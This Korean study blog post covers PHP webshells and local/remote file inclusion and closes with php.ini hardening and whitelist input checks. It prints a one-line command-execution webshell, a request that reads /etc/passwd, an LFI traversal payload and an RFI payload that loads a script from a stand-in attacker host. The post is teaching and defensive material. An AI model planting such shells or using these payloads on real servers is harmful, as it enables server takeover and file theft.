---
layout: post
title: "PHP 공부: 웹 취약점과 웹쉘"
date: 2025-08-21 17:00:00 +0900
categories: [web-technology]
tags: [PHP, Web Hacking, Webshell, RFI, Secure Coding]
description: "PHP 환경에서의 주요 보안 위협(RFI, Webshell)과 보안 설정(php.ini) 및 코딩 기법"
---

## 1. 개요

**PHP**는 전 세계 웹 사이트의 70% 이상에서 사용되는 서버 사이드 스크립트 언어입니다.
하지만 유연한 문법과 강력한 기능 때문에, 잘못 작성된 PHP 코드는 **웹쉘(Webshell)** 업로드나 **원격 파일 포함(RFI)**과 같은 치명적인 공격의 통로가 됩니다.

---

## 2. 공격 시나리오 1: 웹쉘 (Webshell)

웹쉘은 공격자가 웹 서버를 원격에서 제어하기 위해 업로드하는 악성 스크립트 파일입니다.

### 2.1. 간단한 PHP 웹쉘 코드
가장 기본적인 형태의 웹쉘은 다음과 같습니다.
```php
<!-- simple_shell.php -->
<?php
    system($_GET['cmd']);
?>
```
이 파일이 서버에 업로드되면, 공격자는 URL 파라미터를 통해 시스템 명령어를 실행할 수 있습니다.
`http://target.com/uploads/simple_shell.php?cmd=cat /etc/passwd`

   ![PHP](/assets/images/web-technology/PHP_Webshell.png)

---

## 3. 공격 시나리오 2: 파일 포함 (LFI/RFI)

PHP의 `include`, `require` 함수가 사용자 입력을 검증 없이 사용할 때 발생합니다.

### 3.1. 취약한 코드
```php
$page = $_GET['page'];
include($page . '.php');
```

### 3.2. LFI (Local File Inclusion)
서버 내부의 파일을 열람합니다.
`?page=../../../../etc/passwd%00` (Null Byte Injection 등을 이용)

### 3.3. RFI (Remote File Inclusion)
외부의 악성 스크립트를 실행합니다. (`allow_url_include=On` 일 때 가능)
`?page=http://attacker.com/evil_script`
이렇게 되면 공격자 서버에 있는 `evil_script.php`가 대상 서버에서 실행되어 쉘을 획득하게 됩니다.

---

## 4. 보안 설정 (php.ini)

`php.ini` 파일의 설정을 통해 기본적인 공격을 방어할 수 있습니다.

1.  **`allow_url_include = Off`**: RFI 공격을 원천 차단합니다. (필수)
2.  **`expose_php = Off`**: 응답 헤더(`X-Powered-By: PHP/7.4`)에 버전을 노출하지 않습니다.
3.  **`display_errors = Off`**: 에러 메시지를 화면에 출력하지 않아 경로 정보 유출을 막습니다.
4.  **`disable_functions`**: `system`, `exec`, `shell_exec`, `passthru` 등 위험한 함수 사용을 비활성화합니다.

---

## 5. 시큐어 코딩

사용자 입력값은 절대 신뢰해서는 안 됩니다.

### 화이트리스트 검증
입력받을 수 있는 값을 미리 정해두고, 그 외의 값은 모두 거부합니다.

```php
$page = $_GET['page'];
$allowed_pages = ['home', 'login', 'board'];

if (in_array($page, $allowed_pages)) {
    include($page . '.php');
} else {
    // 에러 처리
    echo "Invalid page!";
}
```

<hr class="short-rule">